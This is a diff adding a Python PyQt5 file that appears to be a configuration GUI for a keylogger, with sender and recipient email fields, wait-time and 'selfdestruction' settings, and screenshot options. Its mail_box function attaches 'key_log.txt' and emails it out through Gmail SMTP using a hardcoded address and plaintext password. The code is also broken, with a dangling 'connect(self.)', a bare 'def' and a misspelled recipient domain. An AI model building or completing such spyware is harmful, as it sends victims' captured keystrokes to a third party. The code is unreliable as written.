@@ -1,0 +1,205 @@
+import sys
+from PyQt5.QtWidgets import QApplication, QWidget, QLineEdit, QMessageBox, QLabel, QGridLayout,QComboBox,QPushButton
+
+import datetime
+import time
+
+
+
+class Example(QWidget):
+
+    def __init__(self):
+        super().__init__()
+        self.initUI()
+
+
+    def initUI(self):
+        self.setGeometry(300,300,500,200)
+        self.setWindowTitle("TEST")
+
+        self.mail_from = QLabel('Mail from:')                            # mail_from
+        self.mail_from_Edit = QLineEdit()                                # mail_from_Edit
+        self.mail_from_Edit.returnPressed.connect(self.inputMail_from)   # inputMail_from
+        self.correct_mail_from = QLabel()                                # correct_mail_from
+
+
+        self.password = QLabel('Password:')                              # password
+        self.password_Edit = QLineEdit()                                 # password_Edit
+        self.password_Edit.returnPressed.connect(self.inputPassword)     # inputPassword
+        self.correct_password = QLabel()                                 # correct_password
+
+
+        self.mail_to = QLabel('Mail to:')                                # mail_to
+        self.mail_to_Edit = QLineEdit()                                  # mail_to_Edit
+        self.mail_to_Edit.returnPressed.connect(self.inputMail_to)       # inputMail_to
+        self.correct_mail_to = QLabel()                                  # correct_mail_to
+
+        self.time_wait_line = QLabel('Time wait:')
+        self.time_wait = QComboBox()
+        self.time_wait.addItems(['2min', '5min', '10min', '20min', '1hour',])
+        self.time_wait.activated[str].connect(self.inputTime_wait)
+        self.correct_time_wait =QLabel()
+
+        self.selfdestruction = QLabel('selfdestruction')
+        self.selfdestruction_box = QComboBox()
+        self.selfdestruction_box.addItems(['2min', '10min', '30min', '2hour'])
+        self.selfdestruction_box.activated[str].connect(self.inputSelfdestruction_box)
+        self.correct_selfdestruction_box = QLabel()
+
+
+        self.screenshot = QLabel('screenshot')
+        screenshot_box = QComboBox()
+        screenshot_box.addItems(['Yes', 'No'])
+
+
+
+
+
+
+        self.freq_screenshot = QLabel('Freq screen')# Заготовка
+        self.OC = QLabel('OC') #Заготовка
+
+
+
+
+
+        self.btn_run = QPushButton('RUN!')
+        self.btn_run.clicked().connect(self.)
+
+
+
+
+
+
+        self.grid = QGridLayout()
+        self.grid.setSpacing(10)
+
+        self.grid.addWidget(self.mail_from,0,0)                          #
+        self.grid.addWidget(self.mail_from_Edit,0,1)                     #
+        self.grid.addWidget(self.correct_mail_from,0,2)                  #
+
+
+        self.grid.addWidget(self.password,1,0)                           #
+        self.grid.addWidget(self.password_Edit,1,1)                      #
+        self.grid.addWidget(self.correct_password,1,2)                   #
+
+        self.grid.addWidget(self.mail_to, 2, 0)                          #
+        self.grid.addWidget(self.mail_to_Edit, 2, 1)                     #
+        self.grid.addWidget(self.correct_mail_to, 2, 2)                  #
+
+        self.grid.addWidget(self.time_wait_line,3,0)                     #
+        self.grid.addWidget(self.time_wait,3,1)                          #
+        self.grid.addWidget(self.correct_time_wait,3,2)                  #
+
+
+        self.grid.addWidget(self.selfdestruction,4,0)
+        self.grid.addWidget(self.selfdestruction_box,4,1)
+        self.grid.addWidget(self.correct_selfdestruction_box,4,2)
+
+
+        self.setLayout(self.grid)
+        self.show()
+
+
+
+
+
+
+    def inputMail_from(self):
+        print(self.mail_from_Edit.text())
+        self.input_mail_from = self.mail_from_Edit.text()
+
+
+        if '@' in self.input_mail_from and self.input_mail_from != '':
+            self.correct_mail_from.setText('correct')
+            print('Mail from is correct')
+        else:
+            self.correct_mail_from.setText('wrong')
+            print('Mail from is wrong')
+
+    def inputPassword(self):
+        print(self.password_Edit.text())
+        self.input_password = self.password_Edit.text()
+        if self.input_password != '':
+            self.correct_password.setText('OK')
+            print('OK')
+        else:
+            self.correct_password.setText('NO')
+            print('NO :C')
+
+    def inputMail_to(self):
+        print(self.mail_to_Edit.text())
+        self.input_mail_to = self.mail_to_Edit.text()
+
+
+        if '@' in self.input_mail_to and self.input_mail_to != '':
+            self.correct_mail_to.setText('correct')
+            print('Mail_to is correct')
+        else:
+            self.correct_mail_to.setText('wrong')
+            print('Mail_to is wrong')
+
+    def inputTime_wait(self, text):
+
+        inpit_time_wait = text
+        self.correct_time_wait.setText('OK')
+        print(text)
+        print('OK')
+
+    def inputSelfdestruction_box(self, text):
+
+        input_selfdestruction_box = text
+        self.correct_selfdestruction_box.setText('OK')
+        print(text)
+        print('OK')
+
+
+    def
+
+
+
+    def mail_box(self):
+
+        import smtplib
+        from email.mime.text import MIMEText
+        from email.mime.multipart import MIMEMultipart
+        from email.mime.base import MIMEBase
+        from email import encoders
+        import os.path
+
+        email = 'wacko.dead@gmail.com'
+        password = '2515wacko'
+        send_to_email = 'wacko.dead@gmaol.com'
+        subject = 'Log from' + str(datetime.date.today())
+        message = ''
+        file_location = 'key_log.txt'
+
+        msg = MIMEMultipart()
+        msg['From'] = email
+        msg['To'] = send_to_email
+        msg['Subject'] = subject
+
+        msg.attach(MIMEText(message, 'plain'))
+
+        filename = os.path.basename(file_location)
+        attachment = open(file_location, "rb")
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload((attachment).read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+        msg.attach(part)
+
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email, password)
+        text = msg.as_string()
+        server.sendmail(email, send_to_email, text)
+        server.quit()
+
+
+if __name__ == '__main__':
+
+    app = QApplication(sys.argv)
+    ex = Example()
+    sys.exit(app.exec_())
